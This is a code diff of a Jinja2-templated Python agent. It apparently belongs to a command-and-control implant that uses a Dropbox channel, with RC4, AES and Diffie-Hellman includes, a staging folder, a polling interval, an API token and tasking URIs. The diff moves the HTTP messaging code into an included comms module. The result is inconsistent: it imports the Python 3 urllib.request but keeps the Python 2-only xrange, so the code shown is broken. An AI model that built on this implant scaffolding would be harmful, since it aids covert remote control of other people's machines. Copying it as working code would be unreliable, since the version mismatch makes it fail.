@@ -13,31 +13,13 @@ This file is a Jinja2 template.
 import random
 import string
 import time
-
-import urllib2
+import urllib.request
 
 {% include 'common/rc4.py' %}
 {% include 'common/aes.py' %}
 {% include 'common/diffiehellman.py' %}
 {% include 'common/get_sysinfo.py' %}
-
-def post_message(uri, data):
-    global headers
-    req = urllib2.Request(uri)
-    for key, value in headers.items():
-        req.add_header("%s"%(key),"%s"%(value))
-
-    if data:
-        req.add_data(data)
-
-    o=urllib2.build_opener()
-    o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))
-    urllib2.install_opener(o)
-
-    return (urllib2.urlopen(req).read())
-
-# generate a randomized sessionID
-sessionID = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(8))
+{% include 'dropbox/comms.py' %}
 
 # server configuration information
 stagingFolder = "{{ staging_folder }}"
@@ -47,6 +29,9 @@ pollInterval = int("{{ poll_interval }}")
 # note that this doesn't need the quotes (can just sub an int directly in) but
 # having the quotes lets you run tools like pylint without syntax errors
 t = "{{ api_token }}"
+
+# generate a randomized sessionID
+sessionID = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(8))
 
 parts = profile.split('|')
 taskURIs = parts[0].split(',')
